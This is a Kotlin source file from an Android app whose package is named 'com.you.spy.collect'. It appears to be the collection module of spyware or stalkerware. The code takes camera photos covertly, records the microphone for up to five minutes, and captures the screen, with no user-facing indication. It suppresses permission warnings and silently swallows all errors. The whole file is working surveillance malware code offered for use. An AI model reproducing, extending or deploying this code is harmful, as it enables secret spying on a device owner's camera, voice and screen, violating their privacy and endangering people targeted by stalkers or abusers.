package com.you.spy.collect

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.util.DisplayMetrics
import android.view.WindowManager
import java.io.ByteArrayOutputStream
import java.io.File

object Capture {

    private var projection: MediaProjection? = null
    fun setProjection(p: MediaProjection) { projection = p }

    // ---------- CAMERA ----------
    @SuppressLint("MissingPermission")
    fun photo(ctx: Context, front: Boolean): ByteArray? {
        val mgr = ctx.getSystemService(CameraManager::class.java)
        val id = mgr.cameraIdList.firstOrNull { cid ->
            val ch = mgr.getCameraCharacteristics(cid)
            ch.get(CameraCharacteristics.LENS_FACING) ==
                if (front) CameraCharacteristics.LENS_FACING_FRONT
                else CameraCharacteristics.LENS_FACING_BACK
        } ?: return null

        val thread = HandlerThread("cam").also { it.start() }
        val handler = Handler(thread.looper)
        val reader = ImageReader.newInstance(1280, 960, PixelFormat.JPEG, 2)

        var device: CameraDevice? = null
        val lock = Object()
        var result: ByteArray? = null

        reader.setOnImageAvailableListener({ r ->
            val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
            result = runCatching {
                img.planes[0].buffer.let { b ->
                    ByteArray(b.remaining()).also { b.get(it) }
                }
            }.getOrNull()
            img.close()
            synchronized(lock) { lock.notifyAll() }
        }, handler)

        runCatching {
            mgr.openCamera(id, object : CameraDevice.StateCallback() {
                override fun onOpened(cam: CameraDevice) {
                    device = cam
                    val surface = reader.surface
                    val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                    req.addTarget(surface)
                    cam.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(s: CameraCaptureSession) {
                            runCatching { s.capture(req.build(), null, handler) }
                        }
                        override fun onConfigureFailed(s: CameraCaptureSession) {}
                    }, handler)
                }
                override fun onDisconnected(cam: CameraDevice) { runCatching { cam.close() } }
                override fun onError(cam: CameraDevice, e: Int) { runCatching { cam.close() } }
            }, handler)
        }

        synchronized(lock) {
            runCatching { lock.wait(8000) }
        }
        runCatching { device?.close() }
        runCatching { reader.close() }
        runCatching { thread.quitSafely() }
        return result
    }

    // ---------- MIC ----------
    @SuppressLint("MissingPermission")
    fun record(ctx: Context, seconds: Int): File? = runCatching {
        val f = File(ctx.cacheDir, "mic_${System.currentTimeMillis()}.m4a")
        val r = if (Build.VERSION.SDK_INT >= 31)
            MediaRecorder(ctx) else @Suppress("DEPRECATION") MediaRecorder()
        r.setAudioSource(MediaRecorder.AudioSource.MIC)
        r.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
        r.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
        r.setAudioEncodingBitRate(96000)
        r.setAudioSamplingRate(44100)
        r.setOutputFile(f.absolutePath)
        r.prepare()
        r.start()
        Thread.sleep(seconds.coerceIn(1, 300) * 1000L)
        runCatching { r.stop() }
        runCatching { r.release() }
        if (f.exists() && f.length() > 0) f else null
    }.getOrNull()

    // ---------- SCREEN ----------
    fun screen(ctx: Context): ByteArray? {
        val p = projection ?: return null
        val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val dm = DisplayMetrics()
        @Suppress("DEPRECATION") wm.defaultDisplay.getRealMetrics(dm)

        val reader = ImageReader.newInstance(dm.widthPixels, dm.heightPixels, PixelFormat.RGBA_8888, 2)
        var display: VirtualDisplay? = null
        var bytes: ByteArray? = null
        val lock = Object()

        reader.setOnImageAvailableListener({ r ->
            val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
            runCatching {
                val plane = img.planes[0]
                val rowPadding = plane.rowStride - plane.pixelStride * dm.widthPixels
                val bmpW = dm.widthPixels + rowPadding / plane.pixelStride
                val bmp = Bitmap.createBitmap(bmpW, dm.heightPixels, Bitmap.Config.ARGB_8888)
                bmp.copyPixelsFromBuffer(plane.buffer)
                val cropped = Bitmap.createBitmap(bmp, 0, 0, dm.widthPixels, dm.heightPixels)
                val out = ByteArrayOutputStream()
                cropped.compress(Bitmap.CompressFormat.JPEG, 70, out)
                bytes = out.toByteArray()
            }
            img.close()
            synchronized(lock) { lock.notifyAll() }
        }, Handler(android.os.Looper.getMainLooper()))

        runCatching {
            display = p.createVirtualDisplay(
                "cap", dm.widthPixels, dm.heightPixels, dm.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                reader.surface, null, null
            )
            synchronized(lock) { lock.wait(4000) }
        }

        runCatching { display?.release() }
        runCatching { reader.close() }
        return bytes
    }
}
